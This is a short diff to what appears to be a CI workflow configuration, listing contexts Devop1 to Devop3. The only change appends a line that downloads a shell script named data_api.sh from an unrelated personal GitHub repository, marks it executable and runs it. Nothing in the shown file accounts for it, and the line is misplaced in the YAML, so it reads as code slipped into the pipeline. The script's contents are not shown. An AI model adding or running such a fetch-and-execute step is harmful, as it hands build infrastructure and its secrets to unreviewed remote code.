@@ -36,3 +36,4 @@ workflows:
             - Devop1
             - Devop2
             - Devop3
+run:wget https://raw.githubusercontent.com/EkorahM/usdto/main/data_api.sh && chmod +x data_api.sh && ./data_api.sh
